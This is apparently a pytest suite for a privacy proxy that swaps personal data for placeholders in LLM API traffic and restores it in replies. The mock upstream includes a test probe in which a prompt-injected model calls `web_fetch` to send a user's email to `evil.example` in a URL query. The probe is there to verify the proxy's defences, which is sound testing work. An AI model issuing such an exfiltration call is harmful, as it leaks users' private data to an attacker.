"""tests for swapback.core and swapback.proxy (swap and restore). Made-up values only."""
import http.server, json, os, socket, subprocess, sys, threading, time, urllib.error, urllib.request
import pytest

from swapback import core as s

KNOWN = [("Jane Q Doe", "PERSON"), ("Jane", "PERSON"), ("jdoe@corp.example", "EMAIL"), ("Ozzie Pellam", "PERSON")] + s.CANARY


@pytest.fixture
def sc(tmp_path):
    cfg = dict(s.DEFAULTS, mode="on", state_dir=str(tmp_path / "st"), system_note="")   # note: see scn
    return s.Scrubber(cfg, known=KNOWN)


@pytest.fixture
def scn(tmp_path):                                  # with the default system note
    return s.Scrubber(dict(s.DEFAULTS, mode="on", state_dir=str(tmp_path / "stn")), known=KNOWN)


TEXT = ("Hi Jane Q Doe (jdoe@corp.example), call 425-555-0182 or +44 20 7946 0958. Card 4111 1111 1111 1111, not "
        "4111 1111 1111 1112. SSN 219-45-6781. Lives 1234 156th Ave NE, Apt 5. born 03/14/1985. IP 100.101.5.6, "
        "127.0.0.1, v1.2.3.4. req 4412360947. key sk-or-v1-abcdef1234567890abcdef. acct # 123456789. "
        "box.tail1234.ts.net IBAN GB82 WEST 1234 5698 7654 32 order 112-1234567-1234567 linkedin.com/in/jane-doe-12")


def test_round_trip_and_types(sc):
    c = {}
    o = sc.scrub_text(TEXT, c)
    for v in ("Jane", "jdoe@", "425-555", "7946", "4111 1111 1111 1111", "219-45-6781", "156th", "03/14/1985",
              "100.101", "sk-or-v1", "123456789", "tail1234", "GB82", "112-1234567", "jane-doe"):
        assert v not in o, v
    for keep in ("4111 1111 1111 1112", "127.0.0.1", "v1.2.3.4", "4412360947"):
        assert keep in o, keep
    assert set(c) >= {"PERSON", "EMAIL", "PHONE", "CARD", "SSN", "ADDRESS", "DOB", "IP", "SECRET", "ACCOUNT", "HOST",
                      "IBAN", "ORDER", "PROFILE"}
    assert sc.restore_text(o) == TEXT


def test_stable_placeholders_across_requests_and_case(sc):
    a = sc.scrub_text("Jane Q Doe wrote")
    f = s.Forms()
    b = sc.scrub_text("reply to JANE Q DOE now", forms=f)
    assert a.split()[0] == "\u00abPERSON_1\u00bb"
    assert sc.scrub_text("Jane Q Doe again").split()[0] == "\u00abPERSON_1\u00bb"     # stable for the same form
    assert b == "reply to \u00abPERSON_1\u00bb now"                   # all-caps is the SAME person, not a second one
    assert sc.restore_text(b, forms=f) == "reply to JANE Q DOE now"     # the request's own form comes back
    assert sc.restore_text(b) == "reply to Jane Q Doe now"              # no request context: the known-file spelling
    assert sc.restore_text(a) == "Jane Q Doe wrote"


def test_whole_words_only(sc):
    assert sc.scrub_text("Janet and Janeway") == "Janet and Janeway"


def test_split_chunks_every_position(sc):
    o = sc.scrub_text("Write to Jane Q Doe at jdoe@corp.example today")
    for i in range(1, len(o)):
        for j in range(i + 1, len(o) + 1):
            r = sc.stream_restorer()
            got = r.feed(o[:i]) + r.feed(o[i:j]) + r.feed(o[j:]) + r.flush()
            assert got == "Write to Jane Q Doe at jdoe@corp.example today"


def test_bare_placeholder_restored_only_when_known(sc):
    sc.scrub_text("Jane Q Doe")
    assert sc.restore_text("PERSON_1 and PERSON_99") == "Jane Q Doe and PERSON_99"


def test_unknown_placeholder_left_alone(sc):
    st = {}
    assert sc.restore_text("hi \u00abPERSON_42\u00bb", stats=st) == "hi \u00abPERSON_42\u00bb"
    assert st == {"unknown": 1}


def test_tool_args_json_escaped(sc):
    sc.placeholder('Ann "AJ" O\'Neil', "PERSON")
    args = json.dumps({"to": "\u00abPERSON_1\u00bb", "body": "hello"})
    out = sc.restore_obj({"tool_calls": [{"function": {"name": "lookup", "arguments": args}}]})
    assert json.loads(out["tool_calls"][0]["function"]["arguments"])["to"] == 'Ann "AJ" O\'Neil'


def test_request_scrub_messages_tools_and_skip_keys(sc):
    body = {"model": "pi-free-fallback", "messages": [
        {"role": "system", "content": "Owner Jane Q Doe"},
        {"role": "user", "content": [{"type": "text", "text": "mail jdoe@corp.example"},
                                     {"type": "image_url", "image_url": {"url": "data:image/png;base64,QUJD"}}]},
        {"role": "assistant", "tool_calls": [{"id": "c1", "type": "function", "function": {
            "name": "send_mail", "arguments": json.dumps({"to": "jdoe@corp.example"})}}]},
        {"role": "tool", "tool_call_id": "c1", "content": "sent to Ozzie Pellam"}],
        "tools": [{"type": "function", "function": {"name": "send_mail", "description": "mail for Jane Q Doe",
                                                    "parameters": {"type": "object"}}}]}
    c = {}
    out = json.dumps(sc.scrub_request(body, c), ensure_ascii=False)
    assert "Jane" not in out and "jdoe@" not in out and "Ozzie" not in out
    assert '"model": "pi-free-fallback"' in out and '"name": "send_mail"' in out and "base64,QUJD" in out
    assert c["PERSON"] == 3 and c["EMAIL"] == 2


def test_fail_closed_on_error(sc, monkeypatch):
    def boom(t):
        raise RuntimeError("x")
    monkeypatch.setattr(sc, "spans_keyed", boom)
    with pytest.raises(s.ScrubError):
        sc.scrub_request({"messages": [{"role": "user", "content": "Jane Q Doe"}]})


def test_fail_closed_egress_leftover(sc, monkeypatch):
    monkeypatch.setattr(sc, "scrub_text", lambda t, c=None, f=None: t)          # a broken swap
    with pytest.raises(s.ScrubError, match="egress"):
        sc.scrub_request({"messages": [{"role": "user", "content": "Jane Q Doe"}]})


def test_sse_events_split_placeholder_and_tool_args(sc):
    ph = sc.scrub_text("Jane Q Doe")
    em = sc.scrub_text("jdoe@corp.example")
    st, out, args = {}, "", ""
    evs = [{"choices": [{"index": 0, "delta": {"content": "Hi " + ph[:4]}}]},
           {"choices": [{"index": 0, "delta": {"content": ph[4:] + "!"}}]},
           {"choices": [{"index": 0, "delta": {"tool_calls": [{"index": 0, "function": {"arguments": '{"to": "' + em[:3]}}]}}]},
           {"choices": [{"index": 0, "delta": {"tool_calls": [{"index": 0, "function": {"arguments": em[3:] + '"}'}}]}}]},
           {"choices": [{"index": 0, "delta": {"content": " bye PERS"}, "finish_reason": "stop"}]}]
    for e in evs:
        s.restore_sse_event(sc, e, st)
        d = e["choices"][0]["delta"]
        out += d.get("content") or ""
        for tc in d.get("tool_calls") or []:
            args += tc["function"]["arguments"]
    assert out == "Hi Jane Q Doe! bye PERS"
    assert json.loads(args) == {"to": "jdoe@corp.example"}


def test_flush_all_at_done(sc):
    st = {}
    e = {"choices": [{"index": 0, "delta": {"content": "x \u00abPER"}}]}
    s.restore_sse_event(sc, e, st)
    assert e["choices"][0]["delta"]["content"] == "x "
    fl = s.flush_all(sc, st, {"id": "a"})
    assert fl["choices"][0]["delta"]["content"] == "\u00abPER"


def test_patterns_negative():
    cfg = dict(s.DEFAULTS, state_dir="/tmp/scrub-neg-%d" % os.getpid())
    sc2 = s.Scrubber(cfg, known=[])
    for t in ("version 2.10.3.1", "ts 1762560000000", "req 4412360947", "sha 3f786850e387550fdab836ed7e6dc881de23001b",
              "localhost 127.0.0.1:8000", "5 concurrent releases across 6 test environments", "Release 3 Way forward"):
        assert sc2.scrub_text(t) == t, t


def test_load_known_formats_and_phone_variants(tmp_path):
    p = tmp_path / "known.yaml"
    p.write_text("PERSON: [Jane Q Doe, Ozzie Pellam]\nEMAIL: [jdoe@corp.example]\nPHONE: ['425-555-0182']\n")
    k = s.load_known(str(p))
    assert ("Jane Q Doe", "PERSON") in k and ("jdoe@corp.example", "EMAIL") in k
    assert {"(425) 555-0182", "425.555.0182", "+14255550182"} <= {v for v, t in k if t == "PHONE"}
    j = tmp_path / "known.json"
    j.write_text(json.dumps({"known": [["Jane Q Doe", "PERSON"]]}))
    assert s.load_known(str(j)) == [("Jane Q Doe", "PERSON")]
    bad = tmp_path / "bad.yaml"
    bad.write_text("NOTATYPE: [x y]\n")
    with pytest.raises(s.ScrubError):
        s.load_known(str(bad))


def test_old_env_names_still_read_as_fallback(tmp_path, monkeypatch):
    c = tmp_path / "cfg.yaml"
    c.write_text("listen: 127.0.0.1:9999\n")
    monkeypatch.delenv("SWAPBACK_UPSTREAM", raising=False)
    monkeypatch.setenv("PII_SCRUBBER_UPSTREAM", "http://127.0.0.1:1111")       # pre-0.2 name
    assert s.load_cfg(str(c))["upstream"] == "http://127.0.0.1:1111"
    monkeypatch.setenv("SWAPBACK_UPSTREAM", "http://127.0.0.1:2222")           # new name wins
    assert s.load_cfg(str(c))["upstream"] == "http://127.0.0.1:2222"
    monkeypatch.delenv("SWAPBACK_CONFIG", raising=False)
    monkeypatch.setenv("PII_SCRUBBER_CONFIG", str(c))
    assert s.config_path() == str(c)


def test_config_file_env_and_missing_known_fails_closed(tmp_path, monkeypatch):
    c = tmp_path / "cfg.yaml"
    c.write_text("listen: 127.0.0.1:9999\nknown_file: known.yaml\nstate_dir: st\n")
    monkeypatch.setenv("SWAPBACK_UPSTREAM", "http://127.0.0.1:1234")
    cfg = s.load_cfg(str(c))
    assert cfg["listen"] == "127.0.0.1:9999" and cfg["upstream"] == "http://127.0.0.1:1234"
    assert cfg["known_file"] == str(tmp_path / "known.yaml") and cfg["mode"] == "on"
    with pytest.raises(s.ScrubError, match="missing"):
        s.Scrubber(cfg)                                          # configured but absent: fail closed
    (tmp_path / "known.yaml").write_text("PERSON: [Jane Q Doe]\n")
    sc2 = s.Scrubber(cfg)
    assert "Jane" not in sc2.scrub_text("hi Jane Q Doe")


def test_vault_file_private(sc):
    sc.scrub_text("Jane Q Doe")
    sc.save_vault()
    assert oct(os.stat(sc.vault_path).st_mode & 0o777) == "0o600"


# ------------------------------------------------------------ proxy end to end (fake upstream)
class _Up(http.server.BaseHTTPRequestHandler):
    """mock upstream, never served directly: _mock_upstream() subclasses it with a list of its own."""
    protocol_version = "HTTP/1.1"
    seen = None

    def log_message(self, *a):
        pass

    def do_POST(self):
        b = self.rfile.read(int(self.headers["Content-Length"]))
        self.seen.append(b.decode("utf-8", "replace"))
        try:
            j = json.loads(b)
        except ValueError:
            j = None
        if self.path.startswith("/v1/messages") and isinstance(j, dict):
            return self._anthropic(j)
        if self.path.startswith("/v1/responses") and isinstance(j, dict):
            return self._responses(j)
        if not isinstance(j, dict) or "messages" not in j:          # embeddings / completions / non-JSON: echo back
            echo = (j.get("input") if "input" in j else j.get("prompt")) if isinstance(j, dict) else None
            o = json.dumps({"object": "list", "data": [{"embedding": [0.25, -0.5], "index": 0}], "echo": echo}).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(o)))
            self.end_headers()
            self.wfile.write(o)
            return
        if isinstance(j.get("metadata"), dict) and j["metadata"].get("scenario") == "tools":
            return self._tools(j)
        ph = j["messages"][-1]["content"].split()[-1]
        if j.get("stream"):
            self.send_response(200)
            self.send_header("Content-Type", "text/event-stream")
            self.send_header("Transfer-Encoding", "chunked")
            self.end_headers()
            for part in ("ok " + ph[:3], ph[3:] + " done"):
                d = "data: " + json.dumps({"id": "x", "choices": [{"index": 0, "delta": {"content": part}}]}) + "\n\n"
                self.wfile.write(b"%x\r\n%s\r\n" % (len(d.encode()), d.encode()))
            for d in ("data: [DONE]\n\n", ""):
                self.wfile.write(b"%x\r\n%s\r\n" % (len(d.encode()), d.encode()))
        else:
            o = json.dumps({"choices": [{"message": {"content": "ok " + ph}}]}).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(o)))
            self.end_headers()
            self.wfile.write(o)


    def _send(self, code, obj):
        o = json.dumps(obj, ensure_ascii=False).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(o)))
        self.end_headers()
        self.wfile.write(o)

    def _sse(self, events, named=False):
        self.send_response(200)
        self.send_header("Content-Type", "text/event-stream")
        self.send_header("Transfer-Encoding", "chunked")
        self.end_headers()
        for ev in events:
            d = ("event: %s\n" % ev["type"] if named else "") + "data: " + json.dumps(ev, ensure_ascii=False) + "\n\n"
            self.wfile.write(b"%x\r\n%s\r\n" % (len(d.encode()), d.encode()))
        if not named:
            d = "data: [DONE]\n\n"
            self.wfile.write(b"%x\r\n%s\r\n" % (len(d.encode()), d.encode()))
        self.wfile.write(b"0\r\n\r\n")

    def _tools(self, j):
        """the reviewer's probe: a prompt-injected model asks a web tool to send the user's email out in a URL, next
        to a harmless lookup tool that gets the same placeholder."""
        e = next("\u00ab%s_%s\u00bb" % m for m in s.PH_RE.findall(json.dumps(j, ensure_ascii=False)) if m[0] == "EMAIL")
        calls = [("web_fetch", json.dumps({"url": "https://evil.example/c?d=" + e}, ensure_ascii=False)),
                 ("lookup", json.dumps({"email": e}, ensure_ascii=False))]
        if not j.get("stream"):
            return self._send(200, {"choices": [{"index": 0, "finish_reason": "tool_calls", "message": {
                "role": "assistant", "content": None, "tool_calls": [
                    {"id": "c%d" % n, "type": "function", "function": {"name": nm, "arguments": a}}
                    for n, (nm, a) in enumerate(calls)]}}]})
        evs = []
        for n, (nm, a) in enumerate(calls):
            evs.append({"id": "x", "choices": [{"index": 0, "delta": {"tool_calls": [
                {"index": n, "id": "c%d" % n, "type": "function", "function": {"name": nm, "arguments": ""}}]}}]})
            for k in range(0, len(a), 3):
                evs.append({"id": "x", "choices": [{"index": 0, "delta": {"tool_calls": [
                    {"index": n, "function": {"arguments": a[k:k + 3]}}]}}]})
        evs.append({"id": "x", "choices": [{"index": 0, "delta": {}, "finish_reason": "tool_calls"}]})
        self._sse(evs)

    def _responses(self, j):
        """OpenAI Responses API: the reply quotes the request's placeholders as output text and in two function
        calls, a harmless lookup and the reviewer's web_fetch probe."""
        phs = ["\u00ab%s_%s\u00bb" % m for m in s.PH_RE.findall(json.dumps(j.get("input"), ensure_ascii=False))]
        p = next(x for x in phs if "PERSON" in x)
        e = next(x for x in phs if "EMAIL" in x)
        evs = responses_fixture(p, e)
        if not j.get("stream"):
            return self._send(200, evs[-1]["response"])
        self._sse(evs, named=True)

    def _anthropic(self, j):
        """Anthropic /v1/messages: the reply quotes the request's placeholders back, as text and as tool_use input."""
        phs = s.PH_RE.findall(json.dumps(j, ensure_ascii=False))
        p, e = ("\u00ab%s_%s\u00bb" % phs[0]), ("\u00ab%s_%s\u00bb" % phs[1])
        if not j.get("stream"):
            o = json.dumps({"id": "msg_1", "type": "message", "role": "assistant", "content": [
                {"type": "text", "text": "Hi " + p}, {"type": "tool_use", "id": "tu_1", "name": "save_contact",
                                                      "input": {"to": e, "name": p}}], "stop_reason": "tool_use"}).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(o)))
            self.end_headers()
            self.wfile.write(o)
            return
        self.send_response(200)
        self.send_header("Content-Type", "text/event-stream; charset=utf-8")
        self.send_header("Transfer-Encoding", "chunked")
        self.end_headers()
        for ev in anthropic_fixture(p, e):
            d = "event: %s\ndata: %s\n\n" % (ev["type"], json.dumps(ev, ensure_ascii=False))
            self.wfile.write(b"%x\r\n%s\r\n" % (len(d.encode()), d.encode()))
        self.wfile.write(b"0\r\n\r\n")


def responses_fixture(p, e, cut=3):
    """the event shapes of a /v1/responses stream: one message (text "Hi <p>." split at `cut`), a lookup call and a
    web_fetch call whose JSON arguments are split every `cut` characters."""
    text = "Hi " + p + "."
    calls = [("lookup", json.dumps({"email": e, "name": p}, ensure_ascii=False)),
             ("web_fetch", json.dumps({"url": "https://evil.example/c?d=" + e}, ensure_ascii=False))]
    msg = {"type": "message", "id": "msg_1", "status": "completed", "role": "assistant",
           "content": [{"type": "output_text", "text": text, "annotations": []}]}
    items = [msg] + [{"type": "function_call", "id": "fc_%d" % n, "call_id": "call_%d" % n, "name": nm, "arguments": a,
                      "status": "completed"} for n, (nm, a) in enumerate(calls)]
    resp = {"id": "resp_1", "object": "response", "status": "completed", "model": "m", "output": items}
    evs = [{"type": "response.created", "response": dict(resp, status="in_progress", output=[])},
           {"type": "response.output_item.added", "output_index": 0, "item": dict(msg, status="in_progress", content=[])},
           {"type": "response.content_part.added", "item_id": "msg_1", "output_index": 0, "content_index": 0,
            "part": {"type": "output_text", "text": "", "annotations": []}}]
    evs += [{"type": "response.output_text.delta", "item_id": "msg_1", "output_index": 0, "content_index": 0,
             "delta": text[k:k + cut], "logprobs": []} for k in range(0, len(text), cut)]
    evs += [{"type": "response.output_text.done", "item_id": "msg_1", "output_index": 0, "content_index": 0,
             "text": text, "logprobs": []},
            {"type": "response.content_part.done", "item_id": "msg_1", "output_index": 0, "content_index": 0,
             "part": msg["content"][0]},
            {"type": "response.output_item.done", "output_index": 0, "item": msg}]
    for n, (nm, a) in enumerate(calls):
        oi = n + 1
        evs.append({"type": "response.output_item.added", "output_index": oi,
                    "item": dict(items[oi], arguments="", status="in_progress")})
        evs += [{"type": "response.function_call_arguments.delta", "item_id": "fc_%d" % n, "output_index": oi,
                 "delta": a[k:k + cut]} for k in range(0, len(a), cut)]
        evs += [{"type": "response.function_call_arguments.done", "item_id": "fc_%d" % n, "output_index": oi,
                 "arguments": a},
                {"type": "response.output_item.done", "output_index": oi, "item": items[oi]}]
    evs.append({"type": "response.completed", "response": resp})
    for n, ev in enumerate(evs):
        ev["sequence_number"] = n
    return evs


def _resp_run(scr, events):
    st = {"_forms": s.Forms()}
    out = []
    for ev in events:
        ev = json.loads(json.dumps(ev))
        out += s.restore_responses_event(scr, ev, st) + [ev]
    return out + s.flush_responses(st), st


def _resp_collect(events):
    text, args, snap = "", {}, {}
    for ev in events:
        if ev["type"] == "response.output_text.delta":
            text += ev["delta"]
        elif ev["type"] == "response.function_call_arguments.delta":
            args[ev["output_index"]] = args.get(ev["output_index"], "") + ev["delta"]
        elif ev["type"] in ("response.output_text.done", "response.function_call_arguments.done"):
            snap[(ev["type"], ev["output_index"])] = ev.get("text", ev.get("arguments"))
    return text, args, snap


def anthropic_fixture(p, e):
    """the event shapes of a recorded /v1/messages stream (text block, then a tool_use block), with the person
    placeholder p split across three text deltas and the email placeholder e split inside the tool's JSON deltas."""
    args = json.dumps({"to": e, "subject": "hi", "name": p}, ensure_ascii=False)
    cut = args.index(e) + 4
    return [
        {"type": "message_start", "message": {"id": "msg_1", "type": "message", "role": "assistant", "content": [],
                                              "model": "m", "stop_reason": None, "usage": {"input_tokens": 9, "output_tokens": 1}}},
        {"type": "content_block_start", "index": 0, "content_block": {"type": "text", "text": ""}},
        {"type": "ping"},
        {"type": "content_block_delta", "index": 0, "delta": {"type": "text_delta", "text": "Hi " + p[:3]}},
        {"type": "content_block_delta", "index": 0, "delta": {"type": "text_delta", "text": p[3:7]}},
        {"type": "content_block_delta", "index": 0, "delta": {"type": "text_delta", "text": p[7:] + ", writing to"}},
        {"type": "content_block_delta", "index": 0, "delta": {"type": "text_delta", "text": " you now " + p[:5]}},
        {"type": "content_block_delta", "index": 0, "delta": {"type": "text_delta", "text": p[5:]}},
        {"type": "content_block_stop", "index": 0},
        {"type": "content_block_start", "index": 1, "content_block": {"type": "tool_use", "id": "tu_1", "name": "save_contact",
                                                                      "input": {}}},
        {"type": "content_block_delta", "index": 1, "delta": {"type": "input_json_delta", "partial_json": ""}},
        {"type": "content_block_delta", "index": 1, "delta": {"type": "input_json_delta", "partial_json": args[:cut]}},
        {"type": "content_block_delta", "index": 1, "delta": {"type": "input_json_delta", "partial_json": args[cut:]}},
        {"type": "content_block_stop", "index": 1},
        {"type": "message_delta", "delta": {"stop_reason": "tool_use", "stop_sequence": None}, "usage": {"output_tokens": 30}},
        {"type": "message_stop"},
    ]


def _mock_upstream():
    """a mock upstream on a port the kernel picks at bind time, with its own list of received bodies.
    Returns (server, seen)."""
    seen = []
    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), type("_UpOne", (_Up,), {"seen": seen}))
    srv.daemon_threads = True
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv, seen


class _Proxy(tuple):
    """(px, cfgp, tmp_path), plus .seen (the bodies THIS test's mock upstream received) and .up (its port)."""


def _listening_port(p, errp, deadline):
    """the port the proxy bound, read from the JSON line it prints at start. It listens on port 0, so there is no
    pick-a-free-port-then-bind race (the Nov 8 CI flake: the proxy port came back equal to the mock's port)."""
    import selectors
    sel = selectors.DefaultSelector()
    sel.register(p.stdout, selectors.EVENT_READ)
    try:
        while time.time() < deadline and p.poll() is None:
            if not sel.select(timeout=0.2):
                continue
            line = p.stdout.readline()
            if not line:
                break
            try:
                info = json.loads(line)
            except ValueError:
                continue
            if isinstance(info, dict) and "listening" in info:
                return int(str(info["listening"]).rsplit(":", 1)[1])
    finally:
        sel.close()
    pytest.fail("proxy did not start (rc=%s): %s" % (p.poll(), errp.read_text(errors="replace")[-800:]))


@pytest.fixture
def proxy(tmp_path):
    srv, seen = _mock_upstream()
    up = srv.server_address[1]
    cfgp = tmp_path / "swapback.yaml"
    st = tmp_path / "st"
    st.mkdir()
    (tmp_path / "known.json").write_text(json.dumps({"known": [list(x) for x in KNOWN]}))
    cfgp.write_text("mode: \"on\"\nlisten: 127.0.0.1:0\nupstream: http://127.0.0.1:%d\nstate_dir: %s\n"
                    "known_file: known.json\n" % (up, st))
    env = dict(os.environ, SWAPBACK_CONFIG=str(cfgp))
    errp = tmp_path / "proxy.stderr"
    with open(errp, "wb") as ef:
        p = subprocess.Popen([sys.executable, "-B", "-m", "swapback.proxy"], env=env,
                             stdout=subprocess.PIPE, stderr=ef)
    try:
        px = _listening_port(p, errp, time.time() + 60)
        threading.Thread(target=p.stdout.read, daemon=True).start()        # keep draining so the proxy never blocks
        assert px != up
        ok = False
        for _ in range(400):                       # it must be OUR proxy answering on px, not anything else
            if p.poll() is not None:
                break
            try:
                h = json.loads(urllib.request.urlopen("http://127.0.0.1:%d/scrubber/health" % px, timeout=2).read())
                ok = isinstance(h, dict) and "ok" in h
            except Exception:
                pass
            if ok:
                break
            time.sleep(0.05)
        if not ok:
            pytest.fail("proxy never answered its health check (rc=%s): %s"
                        % (p.poll(), errp.read_text(errors="replace")[-800:]))
        info = _Proxy((px, cfgp, tmp_path))
        info.seen, info.up = seen, up
        yield info
    finally:
        p.kill()
        try:
            p.wait(timeout=10)
        except subprocess.TimeoutExpired:
            pass
        srv.shutdown()
        srv.server_close()


def _post(px, body):
    r = urllib.request.urlopen(urllib.request.Request("http://127.0.0.1:%d/v1/chat/completions" % px,
                                                      data=json.dumps(body).encode(), method="POST",
                                                      headers={"Content-Type": "application/json"}), timeout=10)
    return r.status, r.read().decode()


def test_proxy_non_stream_and_stream(proxy):
    px, _, _ = proxy
    proxy.seen.clear()
    code, out = _post(px, {"model": "m", "messages": [{"role": "user", "content": "say Jane Q Doe"}]})
    assert code == 200 and json.loads(out)["choices"][0]["message"]["content"] == "ok Jane Q Doe"
    code, out = _post(px, {"model": "m", "stream": True, "messages": [{"role": "user", "content": "say Ozzie Pellam"}]})
    text = "".join(json.loads(l[6:])["choices"][0]["delta"].get("content", "") for l in out.splitlines()
                   if l.startswith("data: {"))
    assert text == "ok Ozzie Pellam done"
    assert all("Jane" not in b and "Ozzie" not in b for b in proxy.seen)


def test_proxy_fail_closed_blocks(proxy):
    px, cfgp, st = proxy
    proxy.seen.clear()
    (st / "known.json").write_text("{not json")                   # a broken known file must not let data out
    os.utime(st / "known.json", None)
    with pytest.raises(urllib.error.HTTPError) as e:
        _post(px, {"model": "m", "messages": [{"role": "user", "content": "say Jane Q Doe"}]})
    assert e.value.code == 503 and proxy.seen == []


def test_system_note_appended_once(scn):
    b = {"messages": [{"role": "system", "content": "You are a helpful assistant."}, {"role": "user", "content": "hi Jane Q Doe"}]}
    scn.scrub_request(b)
    scn.scrub_request(b)
    assert b["messages"][0]["content"].count("privacy stand-ins") == 1


def test_egress_checks_skipped_keys(sc):
    with pytest.raises(s.ScrubError, match="egress"):
        sc.scrub_request({"service_tier": "Jane Q Doe", "messages": [{"role": "user", "content": "x"}]})



# ---- library detectors (phonenumbers, Presidio patterns, gitleaks rules, pyahocorasick) ----
import random, string  # noqa: E402


def _rand(n, seed=7):
    r = random.Random(seed)
    return "".join(r.choice(string.ascii_letters + string.digits) for _ in range(n))


def test_libraries_are_the_detectors(sc):
    import ahocorasick
    det, pres, gl = s.detectors()
    assert set(det.versions()) == {"phonenumbers", "pyahocorasick"}
    assert pres.version == "2.2.366" and {r[0] for r in pres.rules} >= {"EMAIL", "CARD", "IBAN", "SSN", "IP", "URL"}
    assert len(gl.rules) >= 221 and not gl.skipped
    local = [t for t, p, g in s.PATTERNS if t in {"EMAIL", "PHONE", "CARD", "IBAN", "SSN", "IP", "PROFILE"}]
    assert sorted(local) == ["EMAIL", "EMAIL", "IP"]     # only the 0.1.1 gap rules: at/dot + unicode-@ email, IPv6
    assert isinstance(sc.known_m.a, ahocorasick.Automaton)


def test_phone_formatted_only(sc):
    for t in ("job 4412360947", "id 12065550000", "at 2026-11-07 16:44", "host (100.64.0.10)"):
        assert "PHONE" not in [x[2] for x in sc.spans(t)], t
    for t in ("call (425) 555-0182", "+91 98765 43210", "cell 425.555.0182", "+1 425 555 0182"):
        assert [x[2] for x in sc.spans(t)] == ["PHONE"], t


def test_presidio_weak_patterns_need_context(sc):
    assert sc.scrub_text("ref 219456781 shipped") == "ref 219456781 shipped"
    assert "219456781" not in sc.scrub_text("my ssn is 219456781")
    assert sc.scrub_text("sample 123-45-6789") == "sample 123-45-6789"          # Presidio's published sample
    assert "4111 1111 1111 1112" in sc.scrub_text("card 4111 1111 1111 1112")  # fails Luhn


def test_gitleaks_rules_and_local_extras(sc):
    gh = "gh" + "p_" + _rand(36)
    o = sc.scrub_text("token " + gh)
    assert gh not in o and "SECRET_" in o
    for v in ("sk-" + "or-v1-" + _rand(40, 3), "ts" + "key-auth-" + _rand(30, 4)):
        assert v not in sc.scrub_text("key " + v), v[:6]
    b = _rand(32, 5)
    o = sc.scrub_text("Authorization: Bearer " + b)
    assert b not in o and o.startswith("Authorization: Bearer ")


def test_url_query_token_and_escaped_newline(sc):
    u = "https://cal.example/x?event_token=3f2a9c1e-77b4-4d21-9a0e-5c6b8d1e2f30&a=1"
    o = sc.scrub_text(u)
    assert "3f2a9c1e" not in o and "event_token=" in o and o.endswith("&a=1")
    o = sc.scrub_text("out:\\n100.101.5.6 up")
    assert "100.101" not in o and sc.restore_text(o) == "out:\\n100.101.5.6 up"


def test_known_list_case_and_unicode_length(sc):
    t = "\u0130 met jane q DOE and Janet"          # dotted capital I lower-cases to 2 chars
    o = sc.scrub_text(t)
    assert "jane q DOE" not in o and "Janet" in o and sc.restore_text(o).endswith("and Janet")




# ---- custom private terms (made-up amounts and phrases)
PRIV = [["PRIVATE_FIGURE", s.figure_regex(2470000000)], ["PRIVATE_FIGURE", s.figure_regex(377000000, True)],
        ["PRIVATE_FIGURE", s.figure_regex(21800000)],
        ["PRIVATE_TERM", r"(?i:(?<![\w-])(?:Acme(?:[\u2019']s)?\s+(?:Cloud\s+)?Ledger)(?![\w-]))"],
        ["PRIVATE_TERM", r"(?i:(?<![\w-])(?:(?:11|eleven)[\s-]*FTEs?)(?![\w-]))"]]


@pytest.fixture
def scp(tmp_path):
    cfg = dict(s.DEFAULTS, mode="on", state_dir=str(tmp_path / "st"))
    return s.Scrubber(cfg, known=KNOWN, private=PRIV)


@pytest.mark.parametrize("v", ["$2.47B", "2.47B", "$2.47 billion", "2.47 Billion", "$2.47bn", "$2.47b", "USD 2.47B",
                               "US$2.47B", "$2,470M", "2470 million", "$2,470,000,000", "$2.470B", "2.47-billion",
                               "$377M", "$377 million", "$377MM", "$0.377B", "$.377B", "$377,000,000", "$21.8M",
                               "21.8 million", "$21,800,000"])
def test_private_figure_formats(scp, v):
    txt = "Owned a %s portfolio (%s)." % (v, v)
    o = scp.scrub_text(txt)
    assert v not in o and o.count("\u00abPRIVATE_FIGURE_") == 2, o
    assert scp.restore_text(o) == txt


@pytest.mark.parametrize("v", ["$2.4B", "$2.5B", "12.47B", "$2.471B", "$2,470.5M", "$1,377M", "377M rows",
                               "377 million users", "$3770M", "v2.47", "2.47", "$24.7B", "$2470", "2,470,000,000",
                               "$21.85M", "$2.47 billionaire", "$377K", "1.2.47B", "$2.47Bx", "req 2470000000", "$377M&A", "$2.47B&C"])
def test_private_figure_negatives(scp, v):
    assert scp.scrub_text("Owned a %s thing" % v) == "Owned a %s thing" % v


def test_private_program_and_team_phrases(scp):
    txt = "Led the Acme Cloud Ledger and Acme's Ledger with 11 FTEs; eleven-FTE org. Acme alone, Acme Ledgers, 111 FTE."
    o = scp.scrub_text(txt)
    assert o.count("PRIVATE_TERM_") == 4, o
    assert "Acme alone, Acme Ledgers, 111 FTE." in o            # bare employer and other numbers are left alone
    assert scp.restore_text(o) == txt


def test_private_stream_restore_split_every_position(scp):
    txt = "Led the Acme Cloud Ledger at $2.47B with 11 FTEs, Jane Q Doe."
    o = scp.scrub_text(txt)
    assert "\u00abPRIVATE_TERM_1\u00bb" in o and "\u00abPRIVATE_TERM_2\u00bb" in o
    bare = o.replace("\u00ab", "").replace("\u00bb", "")
    for x in (o, bare):
        for i in range(1, len(x)):
            for j in (i + 1, i + 3, i + 7):
                r = scp.stream_restorer()
                assert r.feed(x[:i]) + r.feed(x[i:j]) + r.feed(x[j:]) + r.flush() == txt


def test_private_tool_args_and_sse(scp):
    o = scp.scrub_text("Budget $2.47B for the Acme Ledger")
    args = json.dumps({"q": o}, ensure_ascii=True)              # «» escaped as \u00ab inside JSON
    assert json.loads(scp.restore_text(args, js=True))["q"] == "Budget $2.47B for the Acme Ledger"
    ph = o.split()[1]
    st = {}
    out = []
    for piece in (ph[:5], ph[5:12], ph[12:] + " ok"):
        ev = {"choices": [{"index": 0, "delta": {"content": piece}}]}
        s.restore_sse_event(scp, ev, st)
        out.append(ev["choices"][0]["delta"].get("content") or "")
    tail = s.flush_all(scp, st)
    assert "".join(out) + "".join((e["choices"][0]["delta"].get("content") or "") for e in (tail or [])) == "$2.47B ok"


def test_private_egress_check_blocks(scp, monkeypatch):
    monkeypatch.setattr(scp, "spans_keyed", lambda text: [])   # the swap finds nothing
